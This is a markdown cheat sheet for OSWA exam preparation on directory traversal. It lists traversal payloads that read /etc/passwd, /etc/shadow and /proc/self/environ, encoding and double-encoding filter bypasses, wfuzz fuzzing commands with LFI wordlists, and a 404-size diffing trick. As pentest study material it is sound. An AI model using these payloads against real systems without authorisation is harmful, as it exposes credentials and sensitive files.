---
category: OSWA Web App Pentesting
order: 6
summary: Path traversal payload variations, encoding/filter bypasses, and common sensitive-file targets by OS.
---
# Directory Traversal

## Fast methodology
1. Spot a suggestive param (`file`, `f`, `location`, `search`, `data`, `download`, `page`, `path`, `template`).
2. Try raw traversal → if blocked/normalized, try URL-encoded → if still nothing, fuzz.
3. Test listing and reading as two separate questions — don't assume one implies the other.
4. If a sub-path looks "different" (odd 404 size, unrelated error format), diff it — might be a bundled component with its own bug.
5. Don't sink 20 minutes into one param — move on and come back later.

## Core payloads
```
# Linux — extra ../ beyond root is harmless
../../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../proc/self/environ

# Windows
..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\windows\system32\drivers\etc\hosts

# Nested traversal — survives a filter that strips "../" once
....//....//....//etc/passwd
```
Why `....//` works: a non-recursive filter runs `replace("../", "")` exactly once; deleting the middle `../` leaves the outer characters, which reassemble into `../`. Tell: if a raw `../` payload comes back "flattened" (looks like it vanished), try `....//` next.

## URL-encoded variants (when raw is blocked/normalized)
```
..%2f..%2f..%2f..%2fetc%2fpasswd                  # / -> %2f
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd            # . and / both encoded
..%252f..%252f..%252fetc%252fpasswd                # double-encoded (WAF decodes once)
```

## Confirming normalization is eating your payload
```bash
curl -v "http://target/about.html/../index.html"
# if the GET line resolves to /index.html, the client/proxy normalized it — switch to URL-encoded slashes
```

## wfuzz — directory/file fuzzing
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 "http://target/page?file=FUZZ"
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 1234,5678 "http://target/page?file=FUZZ"
```
`--hc` = hide by status code. `--hh` = hide by response char-count.

## The 404-size-diffing trick (find hidden components fast)
```bash
curl -s -o /dev/null -w "%{size_download}\n" "http://target/doesnotexist123"
curl -s -o /dev/null -w "%{size_download}\n" "http://target/some-plugin-path/doesnotexist123"
```
Different sizes = different backend/component handling that path — worth testing for its own traversal bug.

## Listing vs. traversal — check both
```
GET /files/                      # does it list contents?
GET /files/../../etc/passwd      # does it return file CONTENTS?
```

## OSWA exam notes
wfuzz is **not** on OffSec's explicitly-permitted exam tool list (Nmap, Nikto, Burp, DirBuster, SQLMap, Tplmap, msfvenom, ysoserial are named) — confirm current exam rules before relying on it live; Burp Intruder is the safe fallback for the same fuzzing job.

## Time-management tips
- Suggestive param name found → try the 3 core payloads (raw abs, raw rel, url-encoded) before anything else.
- Don't fuzz first — fuzzing is the fallback, not the opener.
- Set a mental timebox (~10-15 min) per parameter.
